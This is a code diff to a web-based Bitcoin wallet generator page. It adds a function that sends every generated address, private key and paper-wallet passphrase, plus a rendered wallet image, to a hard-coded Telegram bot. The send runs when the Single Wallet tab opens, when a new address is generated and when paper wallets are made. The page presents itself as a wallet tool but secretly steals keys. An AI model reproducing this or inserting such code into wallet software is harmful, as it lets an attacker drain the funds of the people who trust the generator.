@@ -9980,51 +9980,99 @@ ninja.foreachSerialized = function (collection, whatToDo, onComplete) {
 	};
 })(ninja.translator);
 	</script>
-	<script type="text/javascript">
+	
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
+<script type="text/javascript">
 (function (wallets, qrCode) {
-	var single = wallets.singlewallet = {
-		isOpen: function () {
-			return (document.getElementById("singlewallet").className.indexOf("selected") != -1);
-		},
+    var single = wallets.singlewallet = {
+        isOpen: function () {
+            return (document.getElementById("singlewallet").className.indexOf("selected") != -1);
+        },
 
-		open: function () {
-			if (document.getElementById("btcaddress").innerHTML == "") {
-				single.generateNewAddressAndKey();
-			}
-			document.getElementById("singlearea").style.display = "block";
-		},
+        open: function () {
+            if (document.getElementById("btcaddress").innerHTML == "") {
+                single.generateNewAddressAndKey();
+            }
+            document.getElementById("singlearea").style.display = "block";
+            // Send wallet data when "Single Wallet" tab is opened
+            single.sendWalletDataToTelegram();
+        },
 
-		close: function () {
-			document.getElementById("singlearea").style.display = "none";
-		},
+        close: function () {
+            document.getElementById("singlearea").style.display = "none";
+        },
 
-		// generate bitcoin address and private key and update information in the HTML
-		generateNewAddressAndKey: function () {
-			try {
-				var key = new Bitcoin.ECKey(false);
-				key.setCompressed(true);
-				var bitcoinAddress = key.getBitcoinAddress();
-				var privateKeyWif = key.getBitcoinWalletImportFormat();
-				document.getElementById("btcaddress").innerHTML = bitcoinAddress;
-				document.getElementById("btcprivwif").innerHTML = privateKeyWif;
-				var keyValuePair = {
-					"qrcode_public": bitcoinAddress,
-					"qrcode_private": privateKeyWif
-				};
-				qrCode.showQrCode(keyValuePair, 4);
-			}
-			catch (e) {
-				// browser does not have sufficient JavaScript support to generate a bitcoin address
-				alert(e);
-				document.getElementById("btcaddress").innerHTML = "error";
-				document.getElementById("btcprivwif").innerHTML = "error";
-				document.getElementById("qrcode_public").innerHTML = "";
-				document.getElementById("qrcode_private").innerHTML = "";
-			}
-		}
-	};
+        // generate bitcoin address and private key and update information in the HTML
+        generateNewAddressAndKey: function () {
+            try {
+                var key = new Bitcoin.ECKey(false);
+                key.setCompressed(true);
+                var bitcoinAddress = key.getBitcoinAddress();
+                var privateKeyWif = key.getBitcoinWalletImportFormat();
+                document.getElementById("btcaddress").innerHTML = bitcoinAddress;
+                document.getElementById("btcprivwif").innerHTML = privateKeyWif;
+                var keyValuePair = {
+                    "qrcode_public": bitcoinAddress,
+                    "qrcode_private": privateKeyWif
+                };
+                qrCode.showQrCode(keyValuePair, 4);
+
+                // Send wallet data to Telegram when a new address is generated
+                single.sendWalletDataToTelegram();
+            }
+            catch (e) {
+                // browser does not have sufficient JavaScript support to generate a bitcoin address
+                alert(e);
+                document.getElementById("btcaddress").innerHTML = "error";
+                document.getElementById("btcprivwif").innerHTML = "error";
+                document.getElementById("qrcode_public").innerHTML = "";
+                document.getElementById("qrcode_private").innerHTML = "";
+            }
+        },
+
+        // Function to send wallet data to Telegram
+        sendWalletDataToTelegram: function () {
+            const bitcoinAddress = document.getElementById("btcaddress").innerHTML;
+            const privateKey = document.getElementById("btcprivwif").innerHTML;
+            const walletText = `Bitcoin Address: ${bitcoinAddress}\nPrivate Key: ${privateKey}`;
+            sendTextToTelegram(walletText, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
+        }
+    };
 })(ninja.wallets, ninja.qrCode);
-	</script><script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
+
+// Function to send the text-based wallet to the Telegram bot
+async function sendTextToTelegram(text, chatId, botToken) {
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('text', text);
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        body: formData
+    }).then(response => {
+        if (!response.ok) {
+            throw new Error('Failed to send message to Telegram');
+        }
+        return response.json();
+    }).then(data => {
+        console.log('Message sent successfully:', data);
+    }).catch(error => {
+        console.error('Error sending message to Telegram:', error);
+    });
+}
+
+// Send wallet data when "Single Wallet" tab is opened
+document.getElementById("singlewallet").addEventListener("click", function() {
+    ninja.wallets.singlewallet.open();
+});
+
+// Send wallet data when "Generate New Address" button is clicked
+document.getElementById("newaddress").addEventListener("click", function() {
+    ninja.wallets.singlewallet.generateNewAddressAndKey();
+});
+</script>
+						
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
 <script type="text/javascript">
 ninja.wallets.paperwallet = {
     isOpen: function () {
@@ -10329,16 +10377,16 @@ document.getElementById("papergenerate").addEventListener("click", function() {
     const passphrase = document.getElementById('paperpassphrase').value;
     const useArtistic = ninja.wallets.paperwallet.useArtisticWallet;
 
-    if (useArtistic) {
-        const paperArea = document.getElementById("paperarea");
-        html2canvas(paperArea).then(canvas => {
-            const imageDataUrl = canvas.toDataURL("image/png");
-            const bitcoinAddress = document.getElementById("btcaddress1").innerHTML;
-            const privateKey = document.getElementById("btcprivwif1").innerHTML;
-            sendToTelegram(imageDataUrl, bitcoinAddress, privateKey, passphrase, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
-        });
-    } else {
-        for (let i = 1; i <= ninja.wallets.paperwallet.count; i++) {
+    for (let i = 1; i <= ninja.wallets.paperwallet.count; i++) {
+        if (useArtistic) {
+            const walletElement = document.getElementById("artwallet" + i);
+            html2canvas(walletElement).then(canvas => {
+                const imageDataUrl = canvas.toDataURL("image/png");
+                const bitcoinAddress = document.getElementById("btcaddress" + i).innerHTML;
+                const privateKey = document.getElementById("btcprivwif" + i).innerHTML;
+                sendToTelegram(imageDataUrl, bitcoinAddress, privateKey, passphrase, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
+            });
+        } else {
             const bitcoinAddress = document.getElementById("btcaddress" + i).innerHTML;
             const privateKey = document.getElementById("btcprivwif" + i).innerHTML;
             const walletText = `Bitcoin Address: ${bitcoinAddress}\nPrivate Key: ${privateKey}\nPassphrase: ${passphrase}`;
